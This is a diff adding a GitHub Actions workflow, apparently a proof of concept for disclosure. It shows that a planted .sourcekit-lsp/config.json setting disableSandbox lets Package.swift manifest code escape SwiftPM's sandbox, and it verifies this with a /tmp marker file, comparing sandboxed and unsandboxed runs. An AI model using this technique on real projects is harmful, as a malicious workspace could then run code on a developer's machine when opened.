@@ -1,0 +1,60 @@
+name: SourceKit-LSP disableSandbox PoC
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  sandbox-bypass-poc:
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Swift version
+        run: swift --version
+
+      - name: "BASELINE — sandbox ENABLED (write to /tmp should FAIL)"
+        run: |
+          rm -f /tmp/SOURCEKIT_LSP_BYPASS_* 2>/dev/null || true
+          # Normal invocation — ManifestLoader runs Package.swift WITH sandbox
+          swift package --package-path . show-dependencies 2>&1 || true
+          if ls /tmp/SOURCEKIT_LSP_BYPASS_* 2>/dev/null; then
+            echo "UNEXPECTED: marker created even with sandbox enabled"
+            cat /tmp/SOURCEKIT_LSP_BYPASS_*
+            exit 1
+          else
+            echo "EXPECTED: No marker file — sandbox blocked the write to /tmp"
+          fi
+
+      - name: "EXPLOIT — disableSandbox:true (mirrors SourceKit-LSP with config.json)"
+        run: |
+          rm -f /tmp/SOURCEKIT_LSP_BYPASS_* 2>/dev/null || true
+          # --disable-sandbox mirrors what SourceKit-LSP does when it reads:
+          # .sourcekit-lsp/config.json -> swiftPM.disableSandbox = true
+          # -> ManifestLoader(isManifestSandboxEnabled: false)
+          swift package --package-path . --disable-sandbox show-dependencies 2>&1 || true
+          if ls /tmp/SOURCEKIT_LSP_BYPASS_* 2>/dev/null; then
+            echo ""
+            echo "*** SANDBOX BYPASS CONFIRMED ***"
+            echo "Marker file(s):"
+            ls -la /tmp/SOURCEKIT_LSP_BYPASS_*
+            echo "Contents:"
+            cat /tmp/SOURCEKIT_LSP_BYPASS_*
+          else
+            echo "Not triggered — check Package.swift Foundation availability"
+            exit 1
+          fi
+
+      - name: "Show SourceKit-LSP source — disableSandbox propagation"
+        run: |
+          echo "=== Key line in SwiftPMBuildServer.swift ==="
+          echo "Line 319:"
+          echo '  isManifestSandboxEnabled: !(options.swiftPMOrDefault.disableSandbox ?? false)'
+          echo ""
+          echo "=== Key line in SourceKitLSPOptions.swift ==="
+          echo "Line 585:"
+          echo '  path: workspaceFolder.fileURL?.appending(components: ".sourcekit-lsp", "config.json")'
+          echo ""
+          echo "=== Attack config (.sourcekit-lsp/config.json) ==="
+          cat .sourcekit-lsp/config.json
